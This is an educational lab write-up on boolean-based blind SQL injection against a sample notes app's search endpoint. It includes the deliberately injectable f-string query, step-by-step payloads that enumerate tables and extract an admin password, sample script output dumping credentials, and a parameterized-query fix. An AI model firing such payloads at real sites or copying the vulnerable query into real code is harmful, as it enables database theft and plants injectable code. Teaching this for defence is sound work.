# SQL Injection — Blind (Boolean-based)

## Overview

Blind SQL Injection is used when the application is vulnerable to injection but the results of the query are **not visible** on the page. The attacker cannot use UNION SELECT to read data directly. Instead, they ask the database yes/no questions and observe the application's behavior to infer the answer.

In boolean-based blind injection, the attacker distinguishes between two states:
- **TRUE condition** → the page shows results (or behaves normally)
- **FALSE condition** → the page shows no results (or behaves differently)

By asking one question per character, the attacker extracts entire strings from the database — it's slow but just as devastating as classic injection.

## Same Vulnerable Code

This attack uses the exact same `/search` endpoint as the classic attack:

```python
sql = f"SELECT ... FROM notes WHERE title LIKE '%{q}%' OR content LIKE '%{q}%'"
```

No new endpoint is needed. The vulnerability is the same — the attack technique is different.

## How It Works

### Classic vs Blind — The Key Difference

**Classic (In-band):**
```
/search?q=' UNION SELECT username,password FROM users --
```
→ Credentials appear directly in search results. The attacker reads them.

**Blind (Boolean-based):**
```
/search?q=' AND (SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a') --
```
→ If results appear: first character is 'a'. If no results: it's not 'a'.
→ The attacker never sees the actual data — only "yes" or "no".

### Step-by-Step

**1. Confirm blind injection works:**
```
/search?q=' OR 1=1 --     → 9 results (TRUE)
/search?q=' AND 1=2 --    → 0 results (FALSE)
```
The attacker can distinguish TRUE from FALSE — blind injection is possible.

**2. Ask: "How many tables exist?"**
```
/search?q=' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')=1 --  → 0 results (NO)
/search?q=' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')=2 --  → 9 results (YES)
```
Answer: 2 tables.

**3. Extract table name, character by character:**
```
/search?q=' AND SUBSTR((SELECT name FROM sqlite_master LIMIT 1),1,1)='a' --  → NO
/search?q=' AND SUBSTR((SELECT name FROM sqlite_master LIMIT 1),1,1)='b' --  → NO
...
/search?q=' AND SUBSTR((SELECT name FROM sqlite_master LIMIT 1),1,1)='n' --  → YES!
```
First character is 'n'. Continue for position 2, 3, 4... → `notes`

**4. Extract password, character by character:**
```
/search?q=' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a' --  → YES!
/search?q=' AND SUBSTR((SELECT password FROM users WHERE username='admin'),2,1)='a' --  → NO
/search?q=' AND SUBSTR((SELECT password FROM users WHERE username='admin'),2,1)='b' --  → NO
...
/search?q=' AND SUBSTR((SELECT password FROM users WHERE username='admin'),2,1)='d' --  → YES!
```
Character by character: `a` → `d` → `m` → `i` → `n` → `1` → `2` → `3` → **admin123**

## Cost Analysis

For a password of length `L` with a charset of `C` characters:
- **Worst case**: `L × C` requests per password
- **Example**: 8-character password, 62-char charset = ~496 requests
- **In practice**: average is `L × C/2` (character found mid-search)

The script output shows total request count and elapsed time. Compare this to classic injection which dumps everything in **1 request**.

## Why Blind Injection Matters

Many applications hide query results or only show aggregate data (counts, "found"/"not found", etc.). Developers sometimes think this prevents SQL injection — it doesn't. As long as the query is injectable and the attacker can observe ANY behavioral difference between true and false conditions, data can be extracted.

Real-world blind injection signals include:
- Different HTTP status codes (200 vs 500)
- Different page content (results vs "not found")
- Different response sizes
- Different redirect targets
- Even subtle differences like an extra whitespace

## Example Script Output

```
PHASE 1 — Confirm Blind Injection
  [*]   Payload: ' OR 1=1 --  →  9 results
  [*]   Payload: ' AND 1=2 --  →  0 results
  [+] Blind injection confirmed! TRUE=9, FALSE=0

PHASE 2 — Enumerate Tables (Blind)
  [+] Database has 2 table(s)
  [+] Table 1: notes
  [+] Table 2: users

PHASE 4 — Extract Credentials (Blind)
  [+] Found 2 user(s) in database
  [*] User 1 name: admin_
  [*] User 1 name: admin          ← extracted char by char
  [*] User 1 pass: admin123       ← extracted char by char
  [*] User 1 role: admin

  USERNAME            PASSWORD                 ROLE
  ───────────────────────────────────────────────────────
  admin               admin123                 admin
  potato              test123                  user

ATTACK SUMMARY
  Total HTTP requests:  ~1,247
  Time elapsed:         18.3 seconds
```

## Fix (Remediation)

The fix is identical to classic SQL injection — parameterized queries prevent **all** types of SQLi:

```python
# This single fix blocks classic, blind, AND time-based injection:
sql = "SELECT * FROM notes WHERE title LIKE :q"
result = db.session.execute(text(sql), {"q": f"%{q}%"})
```

The input is never part of the SQL structure, so there is nothing to inject into.

## References

- [OWASP Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- [PortSwigger Blind SQLi Labs](https://portswigger.net/web-security/sql-injection/blind)
